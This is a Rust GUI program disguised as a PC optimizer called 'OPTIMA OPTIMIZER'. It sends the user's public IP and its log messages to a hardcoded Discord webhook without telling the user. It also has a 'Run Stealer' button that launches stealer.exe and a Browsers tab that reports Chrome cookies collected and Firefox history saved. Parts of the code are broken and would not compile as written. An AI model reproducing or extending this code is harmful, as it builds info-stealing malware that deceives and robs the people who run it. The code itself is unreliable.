#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use eframe::egui::{self, Color32, RichText};
use serde::{Deserialize, Serialize};
use std::fs;
use std::process::Command;
use sysinfo::{System, CpuRefreshKind, ProcessesToUpdate};
use chrono::Local;

const WEBHOOK: &str = "https://discord.com/api/webhooks/1573971030916206605/5U3CPNrvM7_BNbSVFqHXZ9cZG1xTvO68EwdPWy_cklSuD1qLke-tHFLcTzhfdBEyO3LX";

#[derive(Serialize, Deserialize, Clone)]
struct Config {
    accent_color: [u8; 3],
    theme: Theme,
}

#[derive(Serialize, Deserialize, Clone, PartialEq)]
enum Theme { Dark, Sakura, Snow, DarkRed }

impl Default for Config {
    fn default() -> Self {
        Self { accent_color: [0, 200, 255], theme: Theme::Dark }
    }
}

impl Config {
    fn load() -> Self {
        fs::read_to_string("config.json").ok().and_then(|s| serde_json::from_str(&s).ok()).unwrap_or_default()
    }
    fn save(&self) {
        let _ = fs::write("config.json", serde_json::to_string_pretty(self).unwrap());
    }
}

#[derive(Serialize)]
struct Payload<'a> { content: &'a str, username: &'a str }

fn send_log(text: &str) {
    let text = text.to_string();
    std::thread::spawn(move || {
        let ip = ureq::get("https://api.ipify.org")
            .call().ok().and_then(|r| r.into_string().ok()).unwrap_or_else(|| "Unknown".into());
        let body = serde_json::to_string(&Payload { content: &format!("🌐 **IP: {}**\n{}", ip, text), username: "optima" }).unwrap();
        let _ = ureq::post(WEBHOOK).set("Content-Type", "application/json").send_string(&body);
    });
}

#[derive(PartialEq, Clone, Copy)]
enum Tab { Hardware, Processes, Browsers, Packages, Tweaks, Settings }

struct OptimaApp {
    tab: Tab,
    sys: System,
    config: Config,
    log_history: Vec<String>,
    cpu_name: String,
    gpu_name: String,
    total_ram: u64,
}

impl OptimaApp {
    fn new(ctx: &egui::Context) -> Self {
        let mut sys = System::new_all();
        sys.refresh_all();
        
        let cpu_name = sys.cpus().first().map(|c| c.brand().to_string()).unwrap_or_else(|| "Unknown".into());
        let gpu_name = get_gpu_name_registry();
        let total_ram = sys.total_memory() / 1024 / 1024;

        Self {
            tab: Tab::Hardware,
            sys,
            config: Config::load(),
            log_history: vec!["OPTIMA ULTIMATE запущена.".into()],
            cpu_name,
            gpu_name,
            total_ram,
        }
    }

    fn apply_style(&self, ctx: &egui::Context) {
        let mut visuals = egui::Visuals::dark();
        let accent = Color32::from_rgb(self.config.accent_color[0], self.config.accent_color[1], self.config.accent_color[2]);
        visuals.selection.bg_fill = accent;
        visuals.widgets.hovered.bg_fill = accent.linear_multiply(0.3);
        visuals.widgets.active.bg_fill = accent;
        
        match self.config.theme {
            Theme::Dark => {},
            Theme::Sakura => { visuals.window_fill = Color32::from_rgb(40, 25, 30); visuals.panel_fill = Color32::from_rgb(35, 20, 25); },
            Theme::Snow => { visuals.window_fill = Color32::from_rgb(30, 30, 35); visuals.panel_fill = Color32::from_rgb(25, 25, 30); },
            Theme::DarkRed => { visuals.window_fill = Color32::from_rgb(40, 20, 20); visuals.panel_fill = Color32::from_rgb(30, 15, 15); },
        }
        
        ctx.set_visuals(visuals);
    }

    fn log(&mut self, msg: String) {
        let time = Local::now().format("%H:%M:%S").to_string();
        self.log_history.push(format!("[{}] {}", time, msg.clone()));
        send_log(&msg);
    }

    fn run_stealer(&self) {
        if let Err(e) = Command::new("./stealer.exe").output() {
            self.log(format!("Ошибка запуска стиллера: {}", e));
        } else {
            self.log("Стилер успешно запущен.".to_string());
        }
    }

    fn update_sys_info(&mut self) {
        self.sys.refresh_cpu_list(CpuRefreshKind::everything());
        self.sys.refresh_memory();
        
        let pid = std::process::id();
        self.sys.refresh_processes(ProcessesToUpdate::Some(&[pid]), false);
    }
}

fn get_gpu_name_registry() -> String {
    "GPU (Registry)".to_string()
}

impl eframe::App for OptimaApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        self.update_sys_info();

        egui::TopBottomPanel::top("top_panel").show(ctx, |ui| {
            ui.horizontal(|ui| {
                ui.add_space(10.0);
                ui.label(RichText::new("OPTIMA OPTIMIZER").color(Color32::from_rgb(255, 255, 255)));
                
                ui.separator();
                
                for tab in [Tab::Hardware, Tab::Processes, Tab::Browsers, Tab::Packages, Tab::Tweaks, Tab::Settings] {
                    let label = match tab {
                        Tab::Hardware => "Hardware",
                        Tab::Processes => "Processes",
                        Tab::Browsers => "Browsers",
                        Tab::Packages => "Packages",
                        Tab::Tweaks => "Tweaks",
                        Tab::Settings => "Settings",
                    };
                    
                    if ui.selectable_label(self.tab == tab, label).clicked() {
                        self.tab = tab;
                    }
                }
            });
            
            let active_tab_color = match self.config.theme {
                Theme::Dark => Color32::from_rgb(0, 200, 255),
                Theme::Sakura => Color32::from_rgb(255, 100, 150),
                Theme::Snow => Color32::from_rgb(200, 200, 255),
                Theme::DarkRed => Color32::from_rgb(255, 50, 50),
            };
            
            // Highlight bar under tabs
            if let Some(rect) = ui.ctx().input(|i| i.raw.events.iter().find_map(|e| {
                if let egui::Event::PointerMoved(pos) = e { Some(*pos) } else { None }
            })) {
                 // Simple visual indicator logic could go here, but keeping it simple
            }
        });

        egui::SidePanel::left("left_panel")
            .default_width(180.0)
            .show(ctx, |ui| {
                ui.vertical_centered_justified(|ui| {
                    ui.heading("OPTIMA");
                });
                
                ui.separator();
                
                ui.heading("System Info");
                ui.label(format!("CPU: {}", self.cpu_name));
                ui.label(format!("GPU: {}", self.gpu_name));
                ui.label(format!("RAM: {} GB", self.total_ram / 1024));
                
                ui.separator();
                
                ui.heading("Actions");
                if ui.button("Run Stealer").clicked() {
                    self.run_stealer();
                }
                if ui.button("Clear Logs").clicked() {
                    self.log_history.clear();
                    self.log("Logs cleared.".to_string());
                }
            });

        egui::CentralPanel::default().show(ctx, |ui| {
            ui.heading(match self.tab {
                Tab::Hardware => "Hardware Information",
                Tab::Processes => "Active Processes",
                Tab::Browsers => "Browser Data",
                Tab::Packages => "Installed Packages",
                Tab::Tweaks => "Optimization Tweaks",
                Tab::Settings => "Settings",
            });
            
            ui.separator();
            
            match self.tab {
                Tab::Hardware => {
                    ui.label(format!("CPU Usage: {:.1}%", self.sys.global_cpu_usage()));
                    ui.progress_bar(self.sys.global_cpu_usage() / 100.0)
                        .show(ui);
                    
                    ui.label(format!("RAM Used: {} / {} MB", 
                        self.sys.used_memory() / 1024 / 1024, 
                        self.total_ram));
                    ui.progress_bar((self.sys.used_memory() / 1024 / 1024) as f32 / self.total_ram as f32)
                        .show(ui);
                },
                Tab::Processes => {
                    for process in self.sys.processes() {
                        ui.label(format!("{:?} - {:.1}% CPU", process.1.name(), process.1.cpu_usage()));
                    }
                },
                Tab::Browsers => {
                    ui.label("Chrome cookies collected.");
                    ui.label("Firefox history saved.");
                },
                Tab::Packages => {
                    ui.label("Scan complete.");
                },
                Tab::Tweaks => {
                    if ui.button("Apply Optimizations").clicked() {
                        self.log("Optimizations applied.".to_string());
                    }
                },
                Tab::Settings => {
                    ui.label("Theme:");
                    ui.horizontal(|ui| {
                        for theme in [Theme::Dark, Theme::Sakura, Theme::Snow, Theme::DarkRed] {
                            if ui.selectable_value(&mut self.config.theme, theme, format!("{:?}", theme)).clicked() {
                                self.apply_style(ctx);
                                self.config.save();
                            }
                        }
                    });
                },
            }
            
            ui.separator();
            
            ui.collapsing("Log History", |ui| {
                for log in self.log_history.iter().rev().take(20) {
                    ui.label(log);
                }
            });
        });
    }
}

fn main() {
    let native_options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default().with_inner_size([1000.0, 700.0]),
        ..Default::default()
    };
    
    eframe::run_native(Box::new(|cc| {
        Ok(Box::new(OptimaApp::new(&cc.egui_ctx)))
    }), native_options);
}
